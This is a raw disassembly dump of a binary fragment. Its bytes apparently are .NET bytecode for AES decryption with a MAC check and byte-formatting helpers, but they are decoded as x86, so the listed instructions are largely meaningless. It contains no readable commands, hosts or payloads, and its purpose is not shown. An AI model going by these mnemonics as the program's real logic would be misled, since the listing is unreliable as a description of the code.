  4041a6:	00 00                	add    %al,(%eax)
  4041a8:	0a 07                	or     (%edi),%al
  4041aa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4041b0:	d3 00                	roll   %cl,(%eax)
  4041b2:	00 0a                	add    %cl,(%edx)
  4041b4:	07                   	pop    %es
  4041b5:	17                   	pop    %ss
  4041b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b7:	d4 00                	aam    $0x0
  4041b9:	00 0a                	add    %cl,(%edx)
  4041bb:	07                   	pop    %es
  4041bc:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041bf:	00 00                	add    %al,(%eax)
  4041c1:	0a 07                	or     (%edi),%al
  4041c3:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	04 6f                	add    $0x6f,%al
  4041ca:	d6                   	salc
  4041cb:	00 00                	add    %al,(%eax)
  4041cd:	0a 07                	or     (%edi),%al
  4041cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d0:	d7                   	xlat   %ds:(%ebx)
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	0a 06                	or     (%esi),%al
  4041d5:	07                   	pop    %es
  4041d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d7:	d8 00                	fadds  (%eax)
  4041d9:	00 0a                	add    %cl,(%edx)
  4041db:	17                   	pop    %ss
  4041dc:	73 d9                	jae    0x4041b7
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041e3:	07                   	pop    %es
  4041e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e5:	da 00                	fiaddl (%eax)
  4041e7:	00 0a                	add    %cl,(%edx)
  4041e9:	16                   	push   %ss
  4041ea:	07                   	pop    %es
  4041eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ec:	da 00                	fiaddl (%eax)
  4041ee:	00 0a                	add    %cl,(%edx)
  4041f0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041f3:	4c                   	dec    %esp
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 08                	or     (%eax),%cl
  4041f8:	03 16                	add    (%esi),%edx
  4041fa:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404200:	00 0a                	add    %cl,(%edx)
  404202:	08 6f db             	or     %ch,-0x25(%edi)
  404205:	00 00                	add    %al,(%eax)
  404207:	0a 02                	or     (%edx),%al
  404209:	7b 2b                	jnp    0x404236
  40420b:	00 00                	add    %al,(%eax)
  40420d:	04 73                	add    $0x73,%al
  40420f:	dc 00                	faddl  (%eax)
  404211:	00 0a                	add    %cl,(%edx)
  404213:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404218:	00 00                	add    %al,(%eax)
  40421a:	0a 1f                	or     (%edi),%bl
  40421c:	20 06                	and    %al,(%esi)
  40421e:	6f                   	outsl  %ds:(%esi),(%dx)
  40421f:	dd 00                	fldl   (%eax)
  404221:	00 0a                	add    %cl,(%edx)
  404223:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404226:	20 59 6f             	and    %bl,0x6f(%ecx)
  404229:	de 00                	fiadds (%eax)
  40422b:	00 0a                	add    %cl,(%edx)
  40422d:	13 04 06             	adc    (%esi,%eax,1),%eax
  404230:	16                   	push   %ss
  404231:	6a 6f                	push   $0x6f
  404233:	4e                   	dec    %esi
  404234:	00 00                	add    %al,(%eax)
  404236:	0a 06                	or     (%esi),%al
  404238:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40423b:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40423e:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  404245:	27                   	daa
  404246:	00 00                	add    %al,(%eax)
  404248:	00 09                	add    %cl,(%ecx)
  40424a:	39 06                	cmp    %eax,(%esi)
  40424c:	00 00                	add    %al,(%eax)
  40424e:	00 09                	add    %cl,(%ecx)
  404250:	6f                   	outsl  %ds:(%esi),(%dx)
  404251:	33 00                	xor    (%eax),%eax
  404253:	00 0a                	add    %cl,(%edx)
  404255:	dc 08                	fmull  (%eax)
  404257:	39 06                	cmp    %eax,(%esi)
  404259:	00 00                	add    %al,(%eax)
  40425b:	00 08                	add    %cl,(%eax)
  40425d:	6f                   	outsl  %ds:(%esi),(%dx)
  40425e:	33 00                	xor    (%eax),%eax
  404260:	00 0a                	add    %cl,(%edx)
  404262:	dc 07                	faddl  (%edi)
  404264:	39 06                	cmp    %eax,(%esi)
  404266:	00 00                	add    %al,(%eax)
  404268:	00 07                	add    %al,(%edi)
  40426a:	6f                   	outsl  %ds:(%esi),(%dx)
  40426b:	33 00                	xor    (%eax),%eax
  40426d:	00 0a                	add    %cl,(%edx)
  40426f:	dc 06                	faddl  (%esi)
  404271:	6f                   	outsl  %ds:(%esi),(%dx)
  404272:	dd 00                	fldl   (%eax)
  404274:	00 0a                	add    %cl,(%edx)
  404276:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  40427c:	00 06                	add    %al,(%esi)
  40427e:	39 06                	cmp    %eax,(%esi)
  404280:	00 00                	add    %al,(%eax)
  404282:	00 06                	add    %al,(%esi)
  404284:	6f                   	outsl  %ds:(%esi),(%dx)
  404285:	33 00                	xor    (%eax),%eax
  404287:	00 0a                	add    %cl,(%edx)
  404289:	dc 11                	fcoml  (%ecx)
  40428b:	05 2a 00 00 00       	add    $0x2a,%eax
  404290:	01 34 00             	add    %esi,(%eax,%eax,1)
  404293:	00 02                	add    %al,(%edx)
  404295:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  40429c:	00 00                	add    %al,(%eax)
  40429e:	00 00                	add    %al,(%eax)
  4042a0:	02 00                	add    (%eax),%al
  4042a2:	6a 00                	push   $0x0
  4042a4:	74 de                	je     0x404284
  4042a6:	00 0d 00 00 00 00    	add    %cl,0x0
  4042ac:	02 00                	add    (%eax),%al
  4042ae:	26 00 c5             	es add %al,%ch
  4042b1:	eb 00                	jmp    0x4042b3
  4042b3:	0d 00 00 00 00       	or     $0x0,%eax
  4042b8:	02 00                	add    (%eax),%al
  4042ba:	17                   	pop    %ss
  4042bb:	00 ee                	add    %ch,%dh
  4042bd:	05 01 0d 00 00       	add    $0xd01,%eax
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	1b 30                	sbb    (%eax),%esi
  4042c6:	05 00 50 01 00       	add    $0x15000,%eax
  4042cb:	00 17                	add    %dl,(%edi)
  4042cd:	00 00                	add    %al,(%eax)
  4042cf:	11 03                	adc    %eax,(%ebx)
  4042d1:	3a 0b                	cmp    (%ebx),%cl
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	00 72 32             	add    %dh,0x32(%edx)
  4042d8:	27                   	daa
  4042d9:	00 70 73             	add    %dh,0x73(%eax)
  4042dc:	cf                   	iret
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	0a 7a 03             	or     0x3(%edx),%bh
  4042e2:	73 4d                	jae    0x404331
  4042e4:	00 00                	add    %al,(%eax)
  4042e6:	0a 0a                	or     (%edx),%cl
  4042e8:	73 d1                	jae    0x4042bb
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	0a 0b                	or     (%ebx),%cl
  4042ee:	07                   	pop    %es
  4042ef:	20 00                	and    %al,(%eax)
  4042f1:	01 00                	add    %eax,(%eax)
  4042f3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a 07                	or     (%edi),%al
  4042fa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404300:	d3 00                	roll   %cl,(%eax)
  404302:	00 0a                	add    %cl,(%edx)
  404304:	07                   	pop    %es
  404305:	17                   	pop    %ss
  404306:	6f                   	outsl  %ds:(%esi),(%dx)
  404307:	d4 00                	aam    $0x0
  404309:	00 0a                	add    %cl,(%edx)
  40430b:	07                   	pop    %es
  40430c:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  40430f:	00 00                	add    %al,(%eax)
  404311:	0a 07                	or     (%edi),%al
  404313:	02 7b 2a             	add    0x2a(%ebx),%bh
  404316:	00 00                	add    %al,(%eax)
  404318:	04 6f                	add    $0x6f,%al
  40431a:	d6                   	salc
  40431b:	00 00                	add    %al,(%eax)
  40431d:	0a 02                	or     (%edx),%al
  40431f:	7b 2b                	jnp    0x40434c
  404321:	00 00                	add    %al,(%eax)
  404323:	04 73                	add    $0x73,%al
  404325:	dc 00                	faddl  (%eax)
  404327:	00 0a                	add    %cl,(%edx)
  404329:	0c 08                	or     $0x8,%al
  40432b:	06                   	push   %es
  40432c:	6f                   	outsl  %ds:(%esi),(%dx)
  40432d:	dd 00                	fldl   (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	1f                   	pop    %ds
  404332:	20 06                	and    %al,(%esi)
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40433c:	20 59 6f             	and    %bl,0x6f(%ecx)
  40433f:	de 00                	fiadds (%eax)
  404341:	00 0a                	add    %cl,(%edx)
  404343:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404348:	00 00                	add    %al,(%eax)
  40434a:	01 13                	add    %edx,(%ebx)
  40434c:	04 06                	add    $0x6,%al
  40434e:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404351:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404354:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40435b:	02 09                	add    (%ecx),%cl
  40435d:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404360:	50                   	push   %eax
  404361:	00 00                	add    %al,(%eax)
  404363:	06                   	push   %es
  404364:	3a 0b                	cmp    (%ebx),%cl
  404366:	00 00                	add    %al,(%eax)
  404368:	00 72 60             	add    %dh,0x60(%edx)
  40436b:	27                   	daa
  40436c:	00 70 73             	add    %dh,0x73(%eax)
  40436f:	df 00                	filds  (%eax)
  404371:	00 0a                	add    %cl,(%edx)
  404373:	7a dd                	jp     0x404352
  404375:	0d 00 00 00 08       	or     $0x8000000,%eax
  40437a:	39 06                	cmp    %eax,(%esi)
  40437c:	00 00                	add    %al,(%eax)
  40437e:	00 08                	add    %cl,(%eax)
  404380:	6f                   	outsl  %ds:(%esi),(%dx)
  404381:	33 00                	xor    (%eax),%eax
  404383:	00 0a                	add    %cl,(%edx)
  404385:	dc 1f                	fcompl (%edi)
  404387:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  40438d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  404393:	1f                   	pop    %ds
  404394:	10 6f 45             	adc    %ch,0x45(%edi)
  404397:	00 00                	add    %al,(%eax)
  404399:	0a 26                	or     (%esi),%ah
  40439b:	07                   	pop    %es
  40439c:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043a2:	0a 06                	or     (%esi),%al
  4043a4:	07                   	pop    %es
  4043a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a6:	e1 00                	loope  0x4043a8
  4043a8:	00 0a                	add    %cl,(%edx)
  4043aa:	16                   	push   %ss
  4043ab:	73 d9                	jae    0x404386
  4043ad:	00 00                	add    %al,(%eax)
  4043af:	0a 13                	or     (%ebx),%dl
  4043b1:	06                   	push   %es
  4043b2:	06                   	push   %es
  4043b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043b4:	e2 00                	loop   0x4043b6
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	1f                   	pop    %ds
  4043b9:	10 6a 59             	adc    %ch,0x59(%edx)
  4043bc:	17                   	pop    %ss
  4043bd:	6a 58                	push   $0x58
  4043bf:	d4 8d                	aam    $0x8d
  4043c1:	44                   	inc    %esp
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	01 13                	add    %edx,(%ebx)
  4043c6:	07                   	pop    %es
  4043c7:	11 06                	adc    %eax,(%esi)
  4043c9:	11 07                	adc    %eax,(%edi)
  4043cb:	16                   	push   %ss
  4043cc:	11 07                	adc    %eax,(%edi)
  4043ce:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d1:	45                   	inc    %ebp
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043da:	13 08                	adc    (%eax),%ecx
  4043dc:	11 07                	adc    %eax,(%edi)
  4043de:	16                   	push   %ss
  4043df:	11 08                	adc    %ecx,(%eax)
  4043e1:	16                   	push   %ss
  4043e2:	11 08                	adc    %ecx,(%eax)
  4043e4:	8e 69 28             	mov    0x28(%ecx),%gs
  4043e7:	e3 00                	jecxz  0x4043e9
  4043e9:	00 0a                	add    %cl,(%edx)
  4043eb:	11 08                	adc    %ecx,(%eax)
  4043ed:	13 09                	adc    (%ecx),%ecx
  4043ef:	dd 29                	(bad) (%ecx)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 11                	add    %dl,(%ecx)
  4043f5:	06                   	push   %es
  4043f6:	39 07                	cmp    %eax,(%edi)
  4043f8:	00 00                	add    %al,(%eax)
  4043fa:	00 11                	add    %dl,(%ecx)
  4043fc:	06                   	push   %es
  4043fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4043fe:	33 00                	xor    (%eax),%eax
  404400:	00 0a                	add    %cl,(%edx)
  404402:	dc 07                	faddl  (%edi)
  404404:	39 06                	cmp    %eax,(%esi)
  404406:	00 00                	add    %al,(%eax)
  404408:	00 07                	add    %al,(%edi)
  40440a:	6f                   	outsl  %ds:(%esi),(%dx)
  40440b:	33 00                	xor    (%eax),%eax
  40440d:	00 0a                	add    %cl,(%edx)
  40440f:	dc 06                	faddl  (%esi)
  404411:	39 06                	cmp    %eax,(%esi)
  404413:	00 00                	add    %al,(%eax)
  404415:	00 06                	add    %al,(%esi)
  404417:	6f                   	outsl  %ds:(%esi),(%dx)
  404418:	33 00                	xor    (%eax),%eax
  40441a:	00 0a                	add    %cl,(%edx)
  40441c:	dc 11                	fcoml  (%ecx)
  40441e:	09 2a                	or     %ebp,(%edx)
  404420:	41                   	inc    %ecx
  404421:	64 00 00             	add    %al,%fs:(%eax)
  404424:	02 00                	add    (%eax),%al
  404426:	00 00                	add    %al,(%eax)
  404428:	5a                   	pop    %edx
  404429:	00 00                	add    %al,(%eax)
  40442b:	00 4f 00             	add    %cl,0x0(%edi)
  40442e:	00 00                	add    %al,(%eax)
  404430:	a9 00 00 00 0d       	test   $0xd000000,%eax
  404435:	00 00                	add    %al,(%eax)
  404437:	00 00                	add    %al,(%eax)
  404439:	00 00                	add    %al,(%eax)
  40443b:	00 02                	add    %al,(%edx)
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 e2                	add    %ah,%dl
  404441:	00 00                	add    %al,(%eax)
  404443:	00 42 00             	add    %al,0x0(%edx)
  404446:	00 00                	add    %al,(%eax)
  404448:	24 01                	and    $0x1,%al
  40444a:	00 00                	add    %al,(%eax)
  40444c:	0f 00 00             	sldt   (%eax)
  40444f:	00 00                	add    %al,(%eax)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 02                	add    %al,(%edx)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 1e                	add    %bl,(%esi)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 15 01 00 00 33    	add    %dl,0x33000001
  404461:	01 00                	add    %eax,(%eax)
  404463:	00 0d 00 00 00 00    	add    %cl,0x0
  404469:	00 00                	add    %al,(%eax)
  40446b:	00 02                	add    %al,(%edx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	00 18                	add    %bl,(%eax)
  404471:	00 00                	add    %al,(%eax)
  404473:	00 28                	add    %ch,(%eax)
  404475:	01 00                	add    %eax,(%eax)
  404477:	00 40 01             	add    %al,0x1(%eax)
  40447a:	00 00                	add    %al,(%eax)
  40447c:	0d 00 00 00 00       	or     $0x0,%eax
  404481:	00 00                	add    %al,(%eax)
  404483:	00 13                	add    %dl,(%ebx)
  404485:	30 03                	xor    %al,(%ebx)
  404487:	00 22                	add    %ah,(%edx)
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 18                	add    %bl,(%eax)
  40448d:	00 00                	add    %al,(%eax)
  40448f:	11 17                	adc    %edx,(%edi)
  404491:	0a 16                	or     (%esi),%dl
  404493:	0b 38                	or     (%eax),%edi
  404495:	11 00                	adc    %eax,(%eax)
  404497:	00 00                	add    %al,(%eax)
  404499:	03 07                	add    (%edi),%eax
  40449b:	91                   	xchg   %eax,%ecx
  40449c:	04 07                	add    $0x7,%al
  40449e:	91                   	xchg   %eax,%ecx
  40449f:	3b 02                	cmp    (%edx),%eax
  4044a1:	00 00                	add    %al,(%eax)
  4044a3:	00 16                	add    %dl,(%esi)
  4044a5:	0a 07                	or     (%edi),%al
  4044a7:	17                   	pop    %ss
  4044a8:	58                   	pop    %eax
  4044a9:	0b 07                	or     (%edi),%eax
  4044ab:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b1:	2a 00                	sub    (%eax),%al
  4044b3:	00 1b                	add    %bl,(%ebx)
  4044b5:	30 03                	xor    %al,(%ebx)
  4044b7:	00 6e 00             	add    %ch,0x0(%esi)
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	19 00                	sbb    %eax,(%eax)
  4044be:	00 11                	add    %dl,(%ecx)
  4044c0:	28 19                	sub    %bl,(%ecx)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	0a 02                	or     (%edx),%al
  4044c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044c7:	1f                   	pop    %ds
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	0a 0a                	or     (%edx),%cl
  4044cc:	73 e5                	jae    0x4044b3
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	0a 0b                	or     (%ebx),%cl
  4044d2:	07                   	pop    %es
  4044d3:	06                   	push   %es
  4044d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044d5:	8f 00                	pop    (%eax)
  4044d7:	00 0a                	add    %cl,(%edx)
  4044d9:	0a dd                	or     %ch,%bl
  4044db:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e0:	39 06                	cmp    %eax,(%esi)
  4044e2:	00 00                	add    %al,(%eax)
  4044e4:	00 07                	add    %al,(%edi)
  4044e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e7:	33 00                	xor    (%eax),%eax
  4044e9:	00 0a                	add    %cl,(%edx)
  4044eb:	dc 73 90             	fdivl  -0x70(%ebx)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044f3:	0d 16 13 04 38       	or     $0x38041316,%eax
  4044f8:	1f                   	pop    %ds
  4044f9:	00 00                	add    %al,(%eax)
  4044fb:	00 09                	add    %cl,(%ecx)
  4044fd:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404500:	13 05 08 12 05 72    	adc    0x72051208,%eax
  404506:	b6 27                	mov    $0x27,%dh
  404508:	00 70 28             	add    %dh,0x28(%eax)
  40450b:	91                   	xchg   %eax,%ecx
  40450c:	00 00                	add    %al,(%eax)
  40450e:	0a 6f 92             	or     -0x6e(%edi),%ch
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 26                	or     (%esi),%ah
  404515:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404518:	58                   	pop    %eax
  404519:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40451c:	04 09                	add    $0x9,%al
  40451e:	8e 69 32             	mov    0x32(%ecx),%gs
  404521:	da 08                	fimull (%eax)
  404523:	6f                   	outsl  %ds:(%esi),(%dx)
  404524:	38 00                	cmp    %al,(%eax)
  404526:	00 0a                	add    %cl,(%edx)
  404528:	6f                   	outsl  %ds:(%esi),(%dx)
  404529:	94                   	xchg   %eax,%esp
  40452a:	00 00                	add    %al,(%eax)
  40452c:	0a 2a                	or     (%edx),%ch
  40452e:	00 00                	add    %al,(%eax)
  404530:	01 10                	add    %edx,(%eax)
  404532:	00 00                	add    %al,(%eax)
  404534:	02 00                	add    (%eax),%al
  404536:	12 00                	adc    (%eax),%al
  404538:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  40453d:	00 00                	add    %al,(%eax)
  40453f:	00 1b                	add    %bl,(%ebx)
  404541:	30 02                	xor    %al,(%edx)
  404543:	00 22                	add    %ah,(%edx)
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1a                	add    %bl,(%edx)
  404549:	00 00                	add    %al,(%eax)
  40454b:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  40454e:	00 00                	add    %al,(%eax)
  404550:	0a 0a                	or     (%edx),%cl
  404552:	06                   	push   %es
  404553:	02 6f 8f             	add    -0x71(%edi),%ch
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0b                	or     (%ebx),%cl
  40455a:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404560:	39 06                	cmp    %eax,(%esi)
  404562:	00 00                	add    %al,(%eax)
  404564:	00 06                	add    %al,(%esi)
  404566:	6f                   	outsl  %ds:(%esi),(%dx)
  404567:	33 00                	xor    (%eax),%eax
  404569:	00 0a                	add    %cl,(%edx)
  40456b:	dc 07                	faddl  (%edi)
  40456d:	2a 00                	sub    (%eax),%al
  40456f:	00 01                	add    %al,(%ecx)
  404571:	10 00                	adc    %al,(%eax)
  404573:	00 02                	add    %al,(%edx)
  404575:	00 06                	add    %al,(%esi)
  404577:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  40457d:	00 00                	add    %al,(%eax)
  40457f:	00 13                	add    %dl,(%ebx)
  404581:	30 03                	xor    %al,(%ebx)
  404583:	00 3b                	add    %bh,(%ebx)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 1b                	add    %bl,(%ebx)
  404589:	00 00                	add    %al,(%eax)
  40458b:	11 73 90             	adc    %esi,-0x70(%ebx)
  40458e:	00 00                	add    %al,(%eax)
  404590:	0a 0a                	or     (%edx),%cl
  404592:	02 0b                	add    (%ebx),%cl
  404594:	16                   	push   %ss
  404595:	0c 38                	or     $0x38,%al
  404597:	1f                   	pop    %ds
  404598:	00 00                	add    %al,(%eax)
  40459a:	00 07                	add    %al,(%edi)
  40459c:	08 91 0d 06 72 bc    	or     %dl,-0x438df9f3(%ecx)
  4045a2:	27                   	daa
  4045a3:	00 70 09             	add    %dh,0x9(%eax)
  4045a6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045aa:	01 28                	add    %ebp,(%eax)
  4045ac:	e6 00                	out    %al,$0x0
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b1:	92                   	xchg   %eax,%edx
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	0a 26                	or     (%esi),%ah
  4045b6:	08 17                	or     %dl,(%edi)
  4045b8:	58                   	pop    %eax
  4045b9:	0c 08                	or     $0x8,%al
  4045bb:	07                   	pop    %es
  4045bc:	8e 69 32             	mov    0x32(%ecx),%gs
  4045bf:	db 06                	fildl  (%esi)
  4045c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c2:	38 00                	cmp    %al,(%eax)
  4045c4:	00 0a                	add    %cl,(%edx)
  4045c6:	2a 00                	sub    (%eax),%al
  4045c8:	13 30                	adc    (%eax),%esi
  4045ca:	03 00                	add    (%eax),%eax
  4045cc:	3b 00                	cmp    (%eax),%eax
  4045ce:	00 00                	add    %al,(%eax)
  4045d0:	1b 00                	sbb    (%eax),%eax
  4045d2:	00 11                	add    %dl,(%ecx)
  4045d4:	73 90                	jae    0x404566
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	0a 0a                	or     (%edx),%cl
  4045da:	02 0b                	add    (%ebx),%cl
  4045dc:	16                   	push   %ss
  4045dd:	0c 38                	or     $0x38,%al
  4045df:	1f                   	pop    %ds
  4045e0:	00 00                	add    %al,(%eax)
  4045e2:	00 07                	add    %al,(%edi)
  4045e4:	08 91 0d 06 72 cc    	or     %dl,-0x338df9f3(%ecx)
  4045ea:	27                   	daa
  4045eb:	00 70 09             	add    %dh,0x9(%eax)
  4045ee:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045f2:	01 28                	add    %ebp,(%eax)
  4045f4:	e6 00                	out    %al,$0x0
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f9:	92                   	xchg   %eax,%edx
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	0a 26                	or     (%esi),%ah
  4045fe:	08 17                	or     %dl,(%edi)
  404600:	58                   	pop    %eax
  404601:	0c 08                	or     $0x8,%al
  404603:	07                   	pop    %es
  404604:	8e 69 32             	mov    0x32(%ecx),%gs
  404607:	db 06                	fildl  (%esi)
  404609:	6f                   	outsl  %ds:(%esi),(%dx)
  40460a:	38 00                	cmp    %al,(%eax)
  40460c:	00 0a                	add    %cl,(%edx)
  40460e:	2a 00                	sub    (%eax),%al
  404610:	13 30                	adc    (%eax),%esi
  404612:	04 00                	add    $0x0,%al
  404614:	2c 00                	sub    $0x0,%al
  404616:	00 00                	add    %al,(%eax)
  404618:	1c 00                	sbb    $0x0,%al
  40461a:	00 11                	add    %dl,(%ecx)
  40461c:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  404622:	00 01                	add    %al,(%ecx)
  404624:	0a 02                	or     (%edx),%al
  404626:	8e 69 17             	mov    0x17(%ecx),%gs
  404629:	59                   	pop    %ecx
  40462a:	0b 16                	or     (%esi),%edx
  40462c:	0c 38                	or     $0x38,%al
  40462e:	0e                   	push   %cs
  40462f:	00 00                	add    %al,(%eax)
  404631:	00 06                	add    %al,(%esi)
  404633:	08 02                	or     %al,(%edx)
  404635:	07                   	pop    %es
  404636:	91                   	xchg   %eax,%ecx
  404637:	9c                   	pushf
  404638:	07                   	pop    %es
  404639:	17                   	pop    %ss
  40463a:	59                   	pop    %ecx
  40463b:	0b 08                	or     (%eax),%ecx
  40463d:	17                   	pop    %ss
  40463e:	58                   	pop    %eax
  40463f:	0c 08                	or     $0x8,%al
  404641:	06                   	push   %es
  404642:	8e 69 32             	mov    0x32(%ecx),%gs
  404645:	ec                   	in     (%dx),%al
  404646:	06                   	push   %es
  404647:	2a 13                	sub    (%ebx),%dl
  404649:	30 02                	xor    %al,(%edx)
  40464b:	00 36                	add    %dh,(%esi)
  40464d:	00 00                	add    %al,(%eax)
  40464f:	00 01                	add    %al,(%ecx)
  404651:	00 00                	add    %al,(%eax)
  404653:	11 16                	adc    %edx,(%esi)
  404655:	0a 38                	or     (%eax),%bh
  404657:	15 00 00 00 02       	adc    $0x2000000,%eax
  40465c:	7b 38                	jnp    0x404696
  40465e:	00 00                	add    %al,(%eax)
  404660:	04 06                	add    $0x6,%al
  404662:	6f                   	outsl  %ds:(%esi),(%dx)
  404663:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  40466a:	00 06                	add    %al,(%esi)
  40466c:	06                   	push   %es
  40466d:	17                   	pop    %ss
  40466e:	58                   	pop    %eax
  40466f:	0a 06                	or     (%esi),%al
  404671:	02 7b 38             	add    0x38(%ebx),%bh
  404674:	00 00                	add    %al,(%eax)
  404676:	04 6f                	add    $0x6f,%al
  404678:	eb 00                	jmp    0x40467a
  40467a:	00 0a                	add    %cl,(%edx)
  40467c:	32 dd                	xor    %ch,%bl
  40467e:	02 7b 38             	add    0x38(%ebx),%bh
  404681:	00 00                	add    %al,(%eax)
  404683:	04 6f                	add    $0x6f,%al
  404685:	ec                   	in     (%dx),%al
  404686:	00 00                	add    %al,(%eax)
  404688:	0a 2a                	or     (%edx),%ch
  40468a:	00 00                	add    %al,(%eax)
  40468c:	13 30                	adc    (%eax),%esi
  40468e:	02 00                	add    (%eax),%al
  404690:	1b 00                	sbb    (%eax),%eax
  404692:	00 00                	add    %al,(%eax)
  404694:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  404699:	94                   	xchg   %eax,%esp
  40469a:	00 00                	add    %al,(%eax)
  40469c:	06                   	push   %es
  40469d:	0a 06                	or     (%esi),%al
  40469f:	02 7d 37             	add    0x37(%ebp),%bh
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	04 02                	add    $0x2,%al
  4046a6:	7b 38                	jnp    0x4046e0
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	04 06                	add    $0x6,%al
  4046ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ad:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046b2:	2a 00                	sub    (%eax),%al
  4046b4:	1b 30                	sbb    (%eax),%esi
  4046b6:	02 00                	add    (%eax),%al
  4046b8:	60                   	pusha
  4046b9:	00 00                	add    %al,(%eax)
  4046bb:	00 1e                	add    %bl,(%esi)
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4046c6:	7d 00                	jge    0x4046c8
  4046c8:	00 0a                	add    %cl,(%edx)
  4046ca:	0c 02                	or     $0x2,%al
  4046cc:	7b 38                	jnp    0x404706
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	04 6f                	add    $0x6f,%al
  4046d2:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046d7:	38 26                	cmp    %ah,(%esi)
  4046d9:	00 00                	add    %al,(%eax)
  4046db:	00 12                	add    %dl,(%edx)
  4046dd:	03 28                	add    (%eax),%ebp
  4046df:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046e4:	04 06                	add    $0x6,%al
